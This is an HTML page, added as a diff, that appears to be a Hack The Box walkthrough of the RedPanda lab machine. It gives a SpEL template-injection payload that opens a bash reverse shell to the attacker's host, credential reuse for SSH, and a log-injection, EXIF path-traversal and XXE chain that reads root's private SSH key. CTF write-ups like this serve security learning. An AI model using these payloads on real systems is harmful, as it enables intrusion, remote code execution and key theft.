@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB RedPanda — Full Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">🐼</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='redpanda'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-redpanda','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-redpanda')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — Walkthrough</div><h1><span>RedPanda</span></h1><div class="hero-meta"><span>OS <strong>Linux</strong></span><span>Difficulty <strong>Easy</strong></span><span>Ports <strong>22 · 8080</strong></span><span>Author <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">SpEL SSTI → woodenk shell</span><span class="chain-arrow">→</span><span class="chain-node blue">Source code → DB creds → SSH</span><span class="chain-arrow">→</span><span class="chain-node red">Log injection → XXE → root SSH key</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>Reconnaissance</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.227.207</span>
+<span class="output">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
+<span class="highlight">8080/tcp open  http</span>    Spring Boot (Java)</span></code></pre>
+
+<p>Port 8080 runs a Spring Boot application — a "Red Panda Search Engine" that lets users search for panda images and displays view counts per author.</p>
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>Initial Access — Spring Expression Language (SpEL) SSTI</h2></div>
+
+<h3>Confirming SSTI</h3>
+<p>The search field reflects user input. Testing for Server-Side Template Injection with SpEL syntax:</p>
+
+<pre><code><span class="comment"># Standard SSTI test — ${7*7} is blocked, but *{} works</span>
+<span class="cmd">Search: *{7*7}</span>
+<span class="output">You searched for: <span class="highlight">49</span></span></code></pre>
+
+<div class="callout callout-why">
+<span class="callout-label">SpEL vs Jinja2 SSTI</span>
+Spring Boot uses Thymeleaf as its template engine, which supports SpEL (Spring Expression Language) via <code>*{}</code> and <code>${}</code> syntax. Unlike Python's Jinja2 where you chain <code>__globals__</code>, SpEL gives direct access to Java's <code>Runtime</code> class for command execution. The <code>$</code> character is often blocked, but <code>*</code> works as an alternative prefix.
+</div>
+
+<h3>Reverse Shell via SpEL</h3>
+<p>Java's <code>Runtime.exec()</code> doesn't handle bash pipes/redirects directly. Use base64 encoding to work around this:</p>
+
+<pre><code><span class="comment"># Step 1: Generate base64-encoded reverse shell command</span>
+<span class="cmd">$ echo -n 'bash -i >& /dev/tcp/10.10.14.15/9001 0>&1' | base64</span>
+<span class="output"><span class="highlight">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS85MDAxIDA+JjE=</span></span>
+
+<span class="comment"># Step 2: Start listener</span>
+<span class="cmd">$ nc -lvnp 9001</span>
+
+<span class="comment"># Step 3: Send SpEL payload via search (use curl to avoid URL encoding issues)</span>
+<span class="cmd">$ curl -s http://redpanda.htb:8080/search \
+    -d 'name=*{T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS85MDAxIDA+JjE=}|{base64,-d}|bash"})}'</span></code></pre>
+
+<div class="callout callout-warn">
+<span class="callout-label">Why {echo,BASE64}|{base64,-d}|bash?</span>
+This syntax uses commas instead of spaces. Java's <code>Runtime.exec()</code> splits on spaces internally when given a single string, breaking commands with spaces in arguments. By using <code>{echo,PAYLOAD}</code>, bash treats the comma-separated values as a single word, avoiding the split problem. The pipe chain decodes the base64 and executes it.
+</div>
+
+<pre><code><span class="output">woodenk@redpanda:~$ whoami
+woodenk
+woodenk@redpanda:~$ id
+uid=1000(woodenk) gid=1001(<span class="highlight">logs</span>) groups=1001(logs),1000(woodenk)
+woodenk@redpanda:~$ cat user.txt
+63a8e3323dab474f3ff92dd238b284ba</span></code></pre>
+
+
+<div class="phase"><div class="phase-number blue">Phase 2</div><h2>Enumeration — Source Code & Database</h2></div>
+
+<h3>Database Credentials in Source</h3>
+<pre><code><span class="cmd">woodenk@redpanda:~$ cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java</span>
+<span class="output">conn = DriverManager.getConnection(
+    "jdbc:mysql://localhost:3306/red_panda",
+    "<span class="highlight">woodenk</span>",
+    "<span class="highlight">RedPandazRule</span>"
+);</span></code></pre>
+
+<p>The database password works for SSH (password reuse):</p>
+<pre><code><span class="cmd">$ ssh woodenk@redpanda.htb</span>
+<span class="output">Password: RedPandazRule</span></code></pre>
+
+<h3>Cron Job Discovery</h3>
+<pre><code><span class="comment"># Upload and run pspy to monitor background processes</span>
+<span class="cmd">woodenk@redpanda:~$ ./pspy64</span>
+<span class="output">CMD: UID=0  PID=...  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar</span></code></pre>
+
+<p>A root cron job periodically runs LogParser, which processes <code>/opt/panda_search/redpanda.log</code>.</p>
+
+<h3>Analyzing LogParser Source</h3>
+<pre><code><span class="cmd">woodenk@redpanda:~$ cat /opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java</span></code></pre>
+
+<p>Two critical functions:</p>
+
+<p><strong><code>parselog()</code></strong> — reads each line of <code>redpanda.log</code>, splits by <code>||</code>, extracts the URI field, and if it contains <code>.jpg</code>, reads the image's EXIF Artist metadata to determine which author's export XML to update.</p>
+
+<p><strong><code>addViewTo()</code></strong> — takes the Artist name, constructs a path <code>/credits/ARTIST_export.xml</code>, parses it as XML, increments the view count, and writes it back. This XML parsing is vulnerable to XXE because it doesn't disable external entities.</p>
+
+<div class="callout callout-key">
+<span class="callout-label">The three-stage chain</span>
+1. <strong>Log injection:</strong> We control the User-Agent header, which gets written to <code>redpanda.log</code>. By injecting <code>||</code> delimiters, we shift what LogParser interprets as the URI field, pointing it to our controlled image file.
+2. <strong>EXIF metadata:</strong> LogParser reads the Artist field from our image. We set Artist to a path-traversal value that points to our malicious XML.
+3. <strong>XXE:</strong> LogParser parses our XML file, which contains an XXE payload reading root's SSH key. The key content gets written into the XML's author field.
+</div>
+
+
+<div class="phase"><div class="phase-number red">Phase 3</div><h2>Privilege Escalation — Log Injection → XXE → Root</h2></div>
+
+<h3>Step 1: Prepare the Image with Malicious Artist Metadata</h3>
+<pre><code><span class="comment"># Copy an existing panda image to /tmp</span>
+<span class="cmd">woodenk@redpanda:~$ cp /opt/panda_search/src/main/resources/static/img/greg.jpg /tmp/greg.jpg</span>
+
+<span class="comment"># Set the Artist field to a path traversal pointing to our XML</span>
+<span class="comment"># LogParser will construct: /credits/../tmp/pwned_export.xml → /tmp/pwned_export.xml</span>
+<span class="cmd">woodenk@redpanda:~$ exiftool -Artist='../tmp/pwned' /tmp/greg.jpg</span>
+
+<span class="comment"># Verify</span>
+<span class="cmd">woodenk@redpanda:~$ exiftool -Artist /tmp/greg.jpg</span>
+<span class="output">Artist                          : ../tmp/pwned</span></code></pre>
+
+<h3>Step 2: Create the Malicious XML (XXE Payload)</h3>
+<pre><code><span class="cmd">woodenk@redpanda:~$ cat &lt;&lt; 'EOF' &gt; /tmp/pwned_export.xml
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"&gt;
+]&gt;
+&lt;credits&gt;
+  &lt;author&gt;&amp;xxe;&lt;/author&gt;
+  &lt;image&gt;
+    &lt;uri&gt;/../../../../../../../../../tmp/greg.jpg&lt;/uri&gt;
+    &lt;views&gt;0&lt;/views&gt;
+  &lt;/image&gt;
+&lt;/credits&gt;
+EOF</span></code></pre>
+
+<div class="callout callout-warn">
+<span class="callout-label">XML structure must match LogParser's expectations</span>
+LogParser expects <code>&lt;credits&gt;</code> with <code>&lt;author&gt;</code> and <code>&lt;image&gt;&lt;uri&gt;</code> tags. Using any other structure (like <code>&lt;userInfo&gt;</code>) will be silently ignored. The XXE entity must be placed inside <code>&lt;author&gt;</code> because that's the field LogParser reads and writes back — it's where the exfiltrated data will appear.
+</div>
+
+<h3>Step 3: Inject the Log Entry via Burp Suite</h3>
+<p>Send a search request with a crafted User-Agent that manipulates the log format. In Burp Repeater:</p>
+
+<pre><code>POST /search HTTP/1.1
+Host: redpanda.htb:8080
+Content-Type: application/x-www-form-urlencoded
+<span class="important">User-Agent: ||/../../../../../../tmp/greg.jpg</span>
+Content-Length: 9
+Connection: close
+
+name=greg</code></pre>
+
+<p>This creates a log entry where LogParser interprets <code>/../../../../../../tmp/greg.jpg</code> as the URI field:</p>
+
+<pre><code><span class="comment"># Verify the log entry was written</span>
+<span class="cmd">woodenk@redpanda:~$ cat /opt/panda_search/redpanda.log</span>
+<span class="output">200||10.10.14.15||<span class="highlight">||/../../../../../../tmp/greg.jpg</span>||/search</span></code></pre>
+
+<h3>Step 4: Wait for Cron → Extract Root SSH Key</h3>
+<pre><code><span class="comment"># Wait 1-2 minutes for LogParser cron job to execute, then check</span>
+<span class="cmd">woodenk@redpanda:~$ cat /tmp/pwned_export.xml</span>
+<span class="output">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+...
+&lt;author&gt;<span class="highlight">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACD...</span>
+-----END OPENSSH PRIVATE KEY-----&lt;/author&gt;</span></code></pre>
+
+<h3>Step 5: SSH as Root</h3>
+<pre><code><span class="comment"># Extract the key from the XML</span>
+<span class="cmd">woodenk@redpanda:~$ grep -oP '(?&lt;=&lt;author&gt;)[\s\S]*?(?=&lt;/author&gt;)' /tmp/pwned_export.xml &gt; /tmp/root_key</span>
+<span class="cmd">woodenk@redpanda:~$ chmod 600 /tmp/root_key</span>
+
+<span class="comment"># SSH as root</span>
+<span class="cmd">woodenk@redpanda:~$ ssh -i /tmp/root_key root@localhost</span>
+
+<span class="cmd">root@redpanda:~# cat root.txt</span>
+<span class="output">f425b554f4e16bab07e75d3bd8f11f2c</span></code></pre>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">Appendix</div><h2>Key Takeaways</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>SpEL SSTI uses <code>*{}</code> when <code>${}</code> is blocked.</strong><p>Thymeleaf supports both prefixes. If one is filtered, try the other. SpEL gives direct access to <code>java.lang.Runtime</code> for command execution.</p></div>
+<div class="takeaway-item"><strong>Java RCE needs special encoding.</strong><p><code>Runtime.exec()</code> splits on spaces. Use <code>{echo,BASE64}|{base64,-d}|bash</code> with commas instead of spaces, or pass a <code>String[]</code> array to <code>exec()</code>.</p></div>
+<div class="takeaway-item"><strong>Log injection + XXE is a powerful chain.</strong><p>If you control any field that gets written to a log, and a privileged process parses that log, you can redirect execution. Here: User-Agent → log → LogParser → image EXIF → XML → XXE → file read.</p></div>
+<div class="takeaway-item"><strong>EXIF metadata is a hidden data channel.</strong><p>Image metadata fields (Artist, Comment, etc.) can carry payloads that downstream tools process. <code>exiftool</code> is the go-to tool for reading and writing EXIF data.</p></div>
+<div class="takeaway-item"><strong>The <code>logs</code> group membership was the key.</strong><p>Being in the <code>logs</code> group gave write access to <code>redpanda.log</code> and read access to the LogParser source code. Always check <code>id</code> and <code>groups</code> for unusual memberships.</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">SpEL SSTI</span><span class="arrow">→</span><span class="node node-green">woodenk shell</span><span class="arrow">→</span><span class="node node-blue">source → DB creds → SSH</span><span class="arrow">→</span><span class="node node-red">log inject → EXIF → XXE → root key</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB RedPanda Writeup · 2026</footer>
+</body></html>
